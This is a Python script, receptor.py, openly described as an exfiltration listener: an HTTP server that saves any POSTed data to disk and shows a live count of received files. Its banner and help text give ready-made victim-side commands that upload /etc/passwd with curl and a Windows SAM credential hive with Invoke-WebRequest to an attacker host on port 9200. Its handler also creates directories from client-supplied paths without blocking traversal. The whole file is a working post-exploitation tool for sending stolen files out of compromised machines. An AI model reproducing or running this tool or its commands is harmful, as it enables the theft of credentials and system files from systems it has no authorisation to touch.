#!/usr/bin/env python3
"""
receptor.py -- Exfiltration listener
Receives POST requests and saves the body as local files.

Usage:
    python3 receptor.py -p <PORT>
    python3 receptor.py -p <PORT> -q    # quiet: no file log lines
"""

import argparse
import os
import shutil
import socket
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

# ── ANSI colors ────────────────────────────────────────────────────────────────
R   = "\033[1;31m"
G   = "\033[1;32m"
Y   = "\033[1;33m"
B   = "\033[1;34m"
C   = "\033[1;36m"
M   = "\033[1;35m"
W   = "\033[1;37m"
DIM = "\033[2m"
RST = "\033[0m"

# ── Global shared state (thread-safe) ─────────────────────────────────────────
_state_lock         = threading.Lock()
_last_transfer_time = None
_last_transfer_file = None
_active_transfer    = None
_total_received     = 0

# Runtime config
_quiet = False
_port  = None

# Terminal output lock
_tty_lock = threading.Lock()

# Header height — must match the number of lines returned by _header_lines()
HEADER_LINES = 10


# ── State helpers ──────────────────────────────────────────────────────────────
def ts():
    return datetime.now().strftime('%H:%M:%S')


def _snap():
    with _state_lock:
        return _last_transfer_time, _last_transfer_file, _active_transfer, _total_received


def _fmt_last(t, f):
    if t is None:
        return f"{DIM}none yet{RST}"
    return f"{G}{int(time.time() - t)}s ago{RST}  {DIM}<- {f}{RST}"


def _fmt_active(a):
    return f"{Y}>> {a}{RST}" if a else f"{DIM}idle{RST}"


# ── Header content ─────────────────────────────────────────────────────────────
def _header_lines(port):
    t, f, a, n = _snap()
    q_tag = f" {M}[quiet]{RST}" if _quiet else ""
    cols  = shutil.get_terminal_size().columns

    return [
        f"{R}+{'=' * (cols - 2)}+{RST}",
        f"{R}|{'  EXFIL RECEIVER  --  receptor.py':^{cols - 2}}|{RST}",
        f"{R}+{'=' * (cols - 2)}+{RST}",
        (f"  {W}Dir:{RST} {C}{os.getcwd()}{RST}"
         f"   {W}Port:{RST} {G}0.0.0.0:{port}{RST}{q_tag}"),
        (f"  {W}Files:{RST} {G}{n}{RST}"
         f"  {W}Last:{RST} {_fmt_last(t, f)}"
         f"  {W}Active:{RST} {_fmt_active(a)}"),
        "",
        f"  {DIM}[Linux]   curl -X POST http://<IP>:{port}/<file> --data-binary @<file>{RST}",
        f"  {DIM}[Windows] Invoke-WebRequest -Uri http://<IP>:{port}/<file> -Method POST -InFile <file>{RST}",
        f"  {Y}Note:{RST} {DIM}Active status may take a moment to update -- transfer is still in progress{RST}",
        f"{DIM}{'-' * cols}{RST}",
    ]
    # ↑ exactly HEADER_LINES = 10 entries


# ── Terminal split-screen management ──────────────────────────────────────────
def _setup_display(port):
    rows = shutil.get_terminal_size().lines
    with _tty_lock:
        sys.stdout.write("\033[2J\033[H")
        for line in _header_lines(port):
            sys.stdout.write(line + "\n")
        sys.stdout.write(f"\033[{HEADER_LINES + 1};{rows}r")
        sys.stdout.write(f"\033[{HEADER_LINES + 1};1H")
        sys.stdout.flush()


def _reset_display():
    rows = shutil.get_terminal_size().lines
    with _tty_lock:
        sys.stdout.write(f"\033[1;{rows}r")
        sys.stdout.write(f"\033[{rows};1H\n")
        sys.stdout.flush()


def _redraw_header(port):
    rows = shutil.get_terminal_size().lines
    buf  = ["\033[s"]
    for i, line in enumerate(_header_lines(port)):
        buf.append(f"\033[{i + 1};1H\033[2K{line}")
    buf.append(f"\033[{rows};1H")
    buf.append("\033[u")
    with _tty_lock:
        sys.stdout.write("".join(buf))
        sys.stdout.flush()


def _log(msg):
    with _tty_lock:
        sys.stdout.write(msg + "\n")
        sys.stdout.flush()


def _header_loop(port):
    while True:
        time.sleep(1)
        _redraw_header(port)


# ── Request handler ────────────────────────────────────────────────────────────
class ExfilHandler(BaseHTTPRequestHandler):
    # Disable Nagle's algorithm: small responses (e.g. 100 Continue, 200 OK)
    # are sent immediately without waiting to fill a TCP segment.
    disable_nagle_algorithm = True

    def do_POST(self):
        global _last_transfer_time, _last_transfer_file, _active_transfer, _total_received

        client_ip = self.client_address[0]
        length    = int(self.headers.get('Content-Length', 0))

        # PowerShell / .NET sends "Expect: 100-continue" and waits for the
        # server to reply before sending the body. We must respond immediately.
        # sendall() writes directly to the OS socket, bypassing every layer
        # of Python IO buffering (wfile → BufferedWriter → socket).
        if self.headers.get('Expect', '').lower() == '100-continue':
            self.connection.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")

        filename = self.path.lstrip('/')
        if not filename:
            filename = f"dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"

        safe_name = os.path.basename(filename)
        subdir    = os.path.dirname(filename.lstrip('/'))
        if subdir:
            os.makedirs(subdir, exist_ok=True)
            save_path = os.path.join(subdir, safe_name)
        else:
            save_path = safe_name

        with _state_lock:
            _active_transfer = safe_name

        raw_data = self.rfile.read(length)

        with open(save_path, 'wb') as fh:
            fh.write(raw_data)

        abs_path = os.path.abspath(save_path)
        size_str = _human_size(length)

        with _state_lock:
            _active_transfer    = None
            _last_transfer_time = time.time()
            _last_transfer_file = safe_name
            _total_received    += 1

        if not _quiet:
            _log(
                f"[{ts()}] {G}[+]{RST} {W}{safe_name}{RST}"
                f"  {G}{size_str}{RST}"
                f"  {DIM}<- {client_ip}{RST}"
                f"  {DIM}-> {abs_path}{RST}"
            )

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK\n")

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"receptor.py running -- use POST to exfiltrate\n")

    def log_message(self, format, *args):
        pass


# ── Helpers ────────────────────────────────────────────────────────────────────
def _human_size(n):
    for u in ('B', 'KB', 'MB', 'GB'):
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"


# ── Help & argument parsing ────────────────────────────────────────────────────
def print_help():
    print(f"""
{R}+======================================================+
|        EXFIL RECEIVER  --  receptor.py               |
+======================================================+{RST}

  {W}USAGE{RST}
    python3 receptor.py {G}-p <PORT>{RST} {DIM}[options]{RST}

  {W}REQUIRED{RST}
    {G}-p, --port <PORT>{RST}          Port to listen on

  {W}OPTIONS{RST}
    {M}-q, --quiet{RST}                Suppress per-file log lines (header only)
    {C}-h, --help{RST}                 Show this help

  {W}EXAMPLES{RST}
    python3 receptor.py {G}-p 9200{RST}
    python3 receptor.py {G}-p 9200{RST} {M}-q{RST}

    {DIM}# Linux{RST}
    curl -X POST http://<IP>:9200/loot.txt --data-binary @/etc/passwd

    {DIM}# Windows{RST}
    Invoke-WebRequest -Uri http://<IP>:9200/sam.save -Method POST -InFile C:\\users\\public\\sam.save
""")


def parse_args():
    if '-h' in sys.argv or '--help' in sys.argv:
        print_help()
        sys.exit(0)

    p = argparse.ArgumentParser(description="Exfiltration listener", add_help=False)
    p.add_argument('-p', '--port',  type=int, metavar='PORT')
    p.add_argument('-q', '--quiet', action='store_true')
    args = p.parse_args()

    if args.port is None:
        print(f"{R}[!] Port is required.{RST}  Use {G}-p <PORT>{RST} or {C}-h{RST} for help.")
        sys.exit(1)
    return args


# ── Entry point ────────────────────────────────────────────────────────────────
def main():
    global _quiet, _port

    args   = parse_args()
    _port  = args.port
    _quiet = args.quiet

    server = HTTPServer(('', _port), ExfilHandler)

    _setup_display(_port)

    t = threading.Thread(target=_header_loop, args=(_port,), daemon=True)
    t.start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        _reset_display()
        print(f"\n[{ts()}] Stopped by user. Goodbye.\n")
        server.server_close()
        sys.exit(0)


if __name__ == '__main__':
    main()
